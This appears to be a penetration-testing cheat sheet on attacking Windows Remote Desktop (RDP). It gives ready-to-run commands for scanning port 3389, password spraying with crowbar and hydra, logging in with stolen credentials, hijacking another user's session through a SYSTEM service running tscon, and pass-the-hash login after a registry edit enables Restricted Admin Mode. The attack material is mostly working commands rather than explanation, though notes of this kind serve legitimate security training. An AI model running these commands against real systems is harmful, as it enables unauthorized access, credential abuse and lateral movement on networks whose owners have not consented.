# Attacking RDP (Remote Desktop Protocol)
## Overview
- **Protocol Function:** A proprietary Microsoft protocol providing a graphical user interface (GUI) to connect to remote computers over a network. Commonly used for central administration and managed service provider (MSP) access.
- **Default Port:** TCP/3389.
- **Enumeration (Nmap):**
    Bash
    ```
    nmap -Pn -p3389 <target_ip>
    ```
## Authentication & Password Spraying
### 1. Password Spraying Tools
Because RDP enforces strict account lockout policies, brute-forcing can easily lock out production accounts. **Password Spraying** (testing a single password against multiple usernames) is the preferred alternative.
- **Crowbar:**
    Bash
    ```
    crowbar -b rdp -s <target_ip>/32 -U usernames.txt -c '<password>'
    ```
- **Hydra:**
    Bash
    ```
    hydra -L usernames.txt -p '<password>' <target_ip> rdp
    ```
    _(Tip: Use `-t 1` or `-t 4` to limit parallel threads and `-W 1` to add delays, as RDP stability degrades under heavy connection counts)._
### 2. Client Connection (`xfreerdp` / `rdesktop`)
Connect to the RDP target once valid plaintext credentials are obtained.
Bash
```
rdesktop -u <username> -p '<password>' <target_ip>
xfreerdp /v:<target_ip> /u:<username> /p:'<password>'
```
## Protocol-Specific Attacks

### 1. RDP Session Hijacking

- **Objective:** Impersonate another active user's RDP session without needing their password to escalate privileges or move laterally.
- **Requirements:** Local Administrator/SYSTEM privileges. _(Note: This technique is obsolete and no longer works on Windows Server 2019+)._
- **Execution Steps:**
    1. Identify active sessions and their target IDs:
        DOS
        ```
        query user
        ```
    2. Create a Windows service running under `NT AUTHORITY\SYSTEM` to execute `tscon.exe`:
        DOS
        ```
        sc.exe create sessionhijack binpath= "cmd.exe /k tscon <target_session_id> /dest:<our_session_name>"
        ```
    3. Start the service to hijack the session:
        DOS
        ```
        net start sessionhijack
        ```
### 2. RDP Pass-the-Hash (PtH)
- **Objective:** Gain GUI access using a user's NTLM hash instead of a plaintext password.
- **Prerequisites:** **Restricted Admin Mode** must be enabled on the target host (disabled by default).
- **Enabling Restricted Admin Mode (Registry Modification):**
    DOS
    ```
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    ```
- **Executing PtH via `xfreerdp`:**
    Bash
    ```
    xfreerdp /v:<target_ip> /u:<username> /pth:<NTLM_hash>
    ```